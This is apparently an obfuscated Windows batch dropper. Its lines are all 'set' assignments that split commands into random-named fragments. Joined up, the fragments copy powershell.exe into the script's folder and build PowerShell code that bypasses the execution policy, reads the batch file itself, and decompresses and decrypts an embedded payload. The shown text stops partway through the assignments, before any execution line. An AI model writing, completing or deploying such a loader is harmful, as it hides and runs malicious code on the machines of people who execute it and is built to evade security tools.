@echo off
set "vFlruihJgG=co"
set "aXphfVyZHw=0\"
set "hBLBTovDHs=xe"
set "tTMhKDVqyl= /"
set "qHSRiGAiiq=ll"
set "jQmZTknEgo=ws"
set "qIEFuAcdkQ=em"
set "rOhWMSLRcz=1."
set "AVhxtPcFpW=\v"
set "GVgIYnnjKv=Po"
set "sFNlHAfGVp=s\"
set "gfuZzfThWC=\W"
set "ccSHmIDLqJ=.e"
set "wLsinNCeZl=po"
set "IKCsatZMdp=he"
set "dUmlsywWOn= C"
set "kNhHSDFasy=rs"
set "PltwZFpqnX=py"
set "rtwhYOSwga=we"
set "rcYTzFvYJZ=he"
set "DnkcSaKswI=we"
set "DasTSVFjgS=ll"
set "fQpSqAtZYW=nd"
set "SizUYWpIHH=in"
set "pCPGqdTCIM=Wi"
set "DnLGofIXha=st"
set "MkUSyqMlXc=ow"
set "vMeIrSWSKh=32"
set "cxSbvojqGQ=y "
set "ogvbCQjcow=do"
set "ETobhrjGRY=Sy"
set "VRTAscVzbN=rS"
set "iyyizWmJCb=:\"
set "ZJznXBvbai=cd"
set "UHdBNHFSFG= %~dp0"
set "XNUflGVKnd=pStr"
set "VFFxGhQdfq=7Yiv"
set "mGFHMVclPT=;$vh"
set "uunAxzAacO=Secu"
set "zhIxNGVtyQ=('da"
set "YqxXeGpHes=yste"
set "uLzvNAAVZO=oArr"
set "LHhwLQjwLc=y.Pa"
set "NbGfZnLOTX=rH.I"
set "uLGvMSukMp=EhJ "
set "mNyiIzSNha=3); "
set "BwLhWJpPuE=form"
set "xqHLOTJZCR=in $"
set "mOZnyxTPZF=Mode"
set "PSgCSDhJNm=e = "
set "LQjcVpMEJI=.Mod"
set "lrXSzXZJpK=saBm"
set "VQdqlGigGO=UGTu"
set "unKViLSeqL=ptor"
set "lZfPcPoMaD=)) {"
set "vrshlAnUBn=.Com"
set "vOiNOWobAH=em.I"
set "nZqUbQnQku=nirt"
set "vAjvQMzZtN=).Sp"
set "GOzDgdWUVb=ing("
set "ASdoGkeHVg=orF'"
set "ZTlQrgMlXT=New-"
set "AFfBGLXUMs=.Key"
set "WtdcooRbus=em.C"
set "EXPDpaJDhp=trea"
set "xKBnGFBwjO=comp"
set "MxmdbUBaWB=t Sy"
set "RYrLpVZEqK=tem."
set "zmPUmTNhjO=ct S"
set "lujsWmLEbJ=)))"
set "TKRDBwrYPb=Fina"
set "TfhebOOCHT=);$B"
set "mWZSYmlhEa=('%~f0'"
set "bbcUvXOvAa=.Len"
set "HOmCIUSGMW=pres"
set "lDmHRUNpCR=y]::"
set "bNFyyKsSKI=join"
set "oKvpROKQYU=$LvE"
set "udlCnHqNHt=n ''"
set "xKRUBibpfl=();$"
set "qEmJKIhIcY=g = "
set "BzbWWXZOYp=ress"
set "GxGWDGIgOi=ment"
set "yCpfvexpie=();$"
set "zaQFRoiLkh=ose("
set "ecUdNJwcCq=);$o"
set "umqKxufOpU=[-1."
set "rFVzTcFjbj=onZH"
set "PTRivzfOCh=bypa"
set "ajNIgeNvUl=[IO."
set "dxxfGBRffG=S46e"
